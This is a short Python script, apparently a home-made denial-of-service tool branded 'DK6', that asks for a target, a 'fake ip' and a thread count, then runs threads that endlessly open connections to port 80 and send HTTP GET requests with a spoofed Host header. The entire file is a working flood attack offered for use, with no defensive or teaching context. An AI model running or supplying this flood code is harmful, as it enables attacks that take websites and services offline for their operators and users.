import threading
import socket
from art import *



tprint("DK6", font="roman")

awnser_target = input("Target: ")
awnser_fakeip = input("Fake ip: ")
awnser_threads =input("Amount of threads: ")

already_sent = 0

target = awnser_target
port = 80
fake_ip = awnser_fakeip

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_sent
        already_sent += 1



for i in range(int(awnser_threads)):
    thread = threading.Thread(target=attack)
    thread.start()

    print(already_sent)
